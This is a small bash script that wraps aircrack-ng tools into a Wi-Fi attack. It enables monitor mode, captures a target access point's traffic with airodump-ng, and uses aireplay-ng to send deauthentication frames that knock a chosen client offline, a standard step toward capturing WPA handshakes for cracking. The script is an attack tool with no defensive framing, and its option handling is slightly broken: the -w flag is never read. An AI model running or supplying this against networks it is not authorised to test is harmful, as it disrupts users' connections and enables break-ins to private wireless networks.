#!/bin/bash

channel=1
interface=wlan0
monitor_interface=${interface}mon
bssid=null
target_bssid=null
write_to=/var/scan-out

print_usage() {
	usage="
Simplification for airckrack.
\tOptions:\n
\t -b - bssid of target AP
\t -c - channel to monitor
\t -i - interface (default: wlan0mon)
\t -w - full path of output file (default: /var/scan-out)
\t -h - help
\t -t - target bssid
"
	printf "$usage"
}

while getopts 'b:c:i:w:ht:' flag; do
	case "${flag}" in
		b) bssid="${OPTARG}" ;;
		c) channel="${OPTARG}" ;;
		i) interface="${OPTARG}" 
			monitor_interface=${interface}mon ;;
		o) write_to="${OPTARG}" ;;
		t) target_bssid="${OPTARG}" ;;
		h) print_usage
			exit 1 ;;
	esac
done

# To hide output
airmon-ng stop ${monitor_interface}

airmon-ng check kill

# Start monitoring mode
airmon-ng start ${interface}

# Open separate terminal for monitoring
gnome-terminal -- sudo airodump-ng -c $channel --bssid $bssid -w $write_to ${monitor_interface}

aireplay-ng -0 5 -a $bssid -c $target_bssid ${monitor_interface}

airmon-ng stop ${monitor_interface}

service NetworkManager start


